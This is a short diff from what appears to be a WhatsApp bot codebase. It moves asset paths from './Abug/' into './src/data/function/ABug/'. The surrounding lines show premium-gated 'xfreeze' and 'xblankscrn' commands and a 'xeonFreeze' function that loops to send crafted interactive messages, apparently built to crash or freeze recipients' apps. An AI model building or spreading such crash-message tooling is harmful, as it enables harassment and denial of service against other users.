@@ -319,7 +319,7 @@ remoteJid: "status@broadcast"
 "interactiveMessage": { 
 "header": {
 "hasMediaAttachment": true,
-"jpegThumbnail": fs.readFileSync(`./Abug/xx1.png`)
+"jpegThumbnail": fs.readFileSync(`./src/data/function/ABug/xx1.png`)
 },
 "nativeFlowMessage": {
 "buttons": [
@@ -344,7 +344,7 @@ remoteJid: "status@broadcast"
 "interactiveMessage": { 
 "header": {
 "hasMediaAttachment": true,
-"jpegThumbnail": fs.readFileSync(`./Abug/xx1.png`)
+"jpegThumbnail": fs.readFileSync(`./src/data/function/ABug/xx1.png`)
 },
 "nativeFlowMessage": {
 "buttons": [
@@ -21263,7 +21263,7 @@ break
 case 'xfreeze': case 'xblankscrn': {
 	if (!isPremium) return replygcalya(mess.prem)
 	const XeonDoc = {
-    url: "./Abug/x.mp3"
+    url: "./src/data/function/ABug/x.mp3"
 };
 async function xeonFreeze(jid){
 	  for (let i = 0; i < 50; i++) {
